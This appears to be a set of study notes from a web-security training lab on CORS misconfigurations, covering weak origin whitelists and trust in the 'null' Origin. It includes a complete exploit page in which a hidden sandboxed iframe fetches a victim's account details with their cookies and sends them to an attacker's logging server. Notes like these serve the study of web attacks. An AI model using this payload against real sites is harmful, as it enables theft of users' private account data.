# Implementing CORS on whitelist

Can also reflect values only from whitelist. Bad implementations include subdomains (some may not exist and could be taken) or allow other organizations with their subdomains. Usually with regular expressions.

normal-website.com

`hackers`normal-website.com

normal-website.com`.evil-user.net`


# Whitelisted null Origin

Origin supports null value in some unusual situations:

* Cross-origin redirects.
* Requests from serialized data.
* Request using the file: protocol.
* Sandboxed cross-origin requests.

### Example

`Origin: null`

`Access-Control-Allow-Origin: null`

The attacker hosts a malicious webpage.

The page contains a sandboxed iframe that executes JavaScript to fetch data from the vulnerable target site

~~~
<!DOCTYPE html>
<html>
<body>
    <h1>Nothing to see here...</h1>

    <iframe 
        sandbox="allow-scripts" 
        id="exploitFrame" 
        srcdoc="
            <script>
                // This request will have 'Origin: null'
                fetch('https://0a11007a030efbbe803d9e38002300f2.web-security-academy.net/accountDetails', {
                    method: 'GET',
                    credentials: 'include' // Sends the victim's cookies
                })
                .then(response => response.json())
                .then(data => {
                    // Send the stolen data to the attacker's logger
                    fetch('https://exploit-0a7600730306fbdc80389d5101950090.exploit-server.net/exploit?data=' + JSON.stringify(data));
                });
            </script>
        " 
        style="display:none;">
    </iframe>

</body>
</html>
~~~
